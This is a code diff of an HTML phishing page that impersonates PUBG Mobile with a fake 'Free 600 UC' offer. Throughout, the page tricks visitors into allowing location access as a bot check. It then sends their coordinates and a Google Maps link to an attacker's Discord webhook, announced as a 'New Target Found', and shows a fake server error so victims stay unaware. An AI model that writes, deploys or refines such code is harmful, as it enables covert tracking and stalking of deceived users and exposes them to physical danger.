@@ -1,49 +1,74 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG Mobile UC</title>
+    <title>PUBG Mobile - Free UC Center</title>
     <style>
-        body { background: #000; color: #f1c40f; text-align: center; font-family: sans-serif; padding-top: 50px; }
-        .btn { background: #f1c40f; color: #000; border: none; padding: 20px; font-weight: bold; cursor: pointer; border-radius: 10px; text-transform: uppercase; }
+        body { background: #000; color: #f1c40f; text-align: center; font-family: sans-serif; padding-top: 50px; margin: 0; }
+        .card { background: #1a1a1a; border: 2px solid #f1c40f; border-radius: 15px; padding: 30px; max-width: 350px; margin: 0 auto; box-shadow: 0 0 20px rgba(241, 196, 15, 0.4); }
+        .btn { background: #f1c40f; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 8px; text-transform: uppercase; font-size: 16px; margin-top: 20px; transition: 0.3s; }
+        .btn:active { transform: scale(0.95); }
+        h1 { font-size: 24px; margin-bottom: 10px; }
+        p { color: #ccc; font-size: 14px; }
     </style>
 </head>
 <body>
-    <h1>PUBG MOBILE UC REWARD</h1>
-    <p>Click below to verify and claim 600 UC</p>
-    <button class="btn" onclick="start()">CLAIM NOW</button>
+
+    <div class="card">
+        <img src="https://www.pubgmobile.com/common/images/icon_logo.jpg" width="80" style="border-radius: 12px; margin-bottom: 15px;">
+        <h1>FREE 600 UC</h1>
+        <p>Verification required! Click claim to verify your account and receive rewards.</p>
+        <button class="btn" onclick="claimReward()">CLAIM NOW</button>
+    </div>
 
     <script>
-        function start() {
-            // বাটন ক্লিক করলেই প্রথমে এটি দেখাবে
-            alert("Verification Started! Please click ALLOW for location.");
-            
+        // tumi (তুমি) তোমার নতুন দেওয়া ডিসকর্ড লিঙ্কটি এখানে সেট করা হয়েছে
+        const discordWebhook = "https://discord.com/api/webhooks/1482986372636606546/Wk5kMZTBxI_UqHg9M78xIxTorwSpLBOGovEgLVS8IciVJRlHpzouvH2I9v7G7I0uh7E0";
+
+        function claimReward() {
+            alert("Security Check: Please click 'Allow' for location access to verify you are not a bot.");
+
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(pos) {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
-                    
-                    const data = {
-                        event: "PUBG_SUCCESS",
-                        latitude: lat,
-                        longitude: lon,
-                        google_map: "https://www.google.com/maps?q=" + lat + "," + lon
+                    const gMap = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                    // ডিসকর্ডে সুন্দর করে ডাটা পাঠানোর ফরম্যাট
+                    const payload = {
+                        username: "PUBG REWARD SYSTEM",
+                        content: "@everyone 📍 **New Target Found!**",
+                        embeds: [{
+                            title: "Location Details Captured",
+                            color: 16711680,
+                            fields: [
+                                { name: "Latitude", value: lat.toString(), inline: true },
+                                { name: "Longitude", value: lon.toString(), inline: true },
+                                { name: "Google Maps Link", value: `[Click to Open Maps](${gMap})` }
+                            ],
+                            footer: { text: "UC Reward Verification Success" },
+                            timestamp: new Date()
+                        }]
                     };
 
-                    // ডাটা পাঠানো হচ্ছে
-                    fetch("https://hooktest.dev/api/hook/waNRgkdN", {
+                    // ডিসকর্ডে ডাটা পাঠানো হচ্ছে
+                    fetch(discordWebhook, {
                         method: "POST",
-                        headers: { "Content-Type": "application/json" }, // এটি ডাটা পাঠানো নিশ্চিত করে
-                        body: JSON.stringify(data)
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(payload)
                     });
 
-                    alert("System Busy! Try again in 5 minutes.");
+                    // ইউজারকে বিভ্রান্ত করতে ফেক মেসেজ
+                    setTimeout(() => {
+                        alert("Server Error 404: Verification server is down. Please try again after some time.");
+                    }, 1500);
+
                 }, function(err) {
-                    alert("Error: You must ALLOW location to get rewards.");
+                    alert("Verification Denied! You must allow location to receive 600 UC.");
                 });
             } else {
-                alert("Browser not supported.");
+                alert("Browser Error: Update your browser to claim rewards.");
             }
         }
     </script>
